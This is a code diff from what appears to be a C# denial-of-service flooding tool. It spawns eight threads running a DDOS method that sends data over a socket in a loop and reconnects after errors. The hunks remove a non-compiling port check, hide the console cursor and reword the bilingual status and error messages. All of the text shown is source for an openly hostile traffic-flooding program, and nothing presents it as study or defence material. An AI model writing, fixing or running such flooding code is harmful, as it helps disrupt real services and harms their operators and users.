@@ -31,7 +31,7 @@ class Program
         while (true)
         {
             Console.Write("端口   |  Port  : ");
-            if (int.TryParse(Console.ReadLine(), out Program.Port) && Console.ReadLine() < 65536)
+            if (int.TryParse(Console.ReadLine(), out Program.Port))
             {
                 break;
             }
@@ -42,7 +42,7 @@ class Program
                 Console.ResetColor();
             }
         }
-        //Console.CursorVisible = false;
+        Console.CursorVisible = false;
         for (int i = 0; i < 8; i++)
         {
             Thread t = new Thread(DDOS);
@@ -74,15 +74,15 @@ class Program
                 socket.Send(data);
                 Console.Clear();
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write("Success\u0020");
+                Console.Write("OK");
                 Console.ResetColor();
-                Console.Write(Program.count);
+                Console.Write("\u0020time =\u0020" + Program.count);
             }
             catch (Exception e)
             {
                 Console.Clear();
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.Write("在发送第" + Program.count + "时发送问题" + e.Message);
+                Console.Write("错误: ERROR At\u0020" + Program.count + "\u0020turns. Message:\u0020" + e.Message);
                 Console.ResetColor();
                 goto reclient;
             }
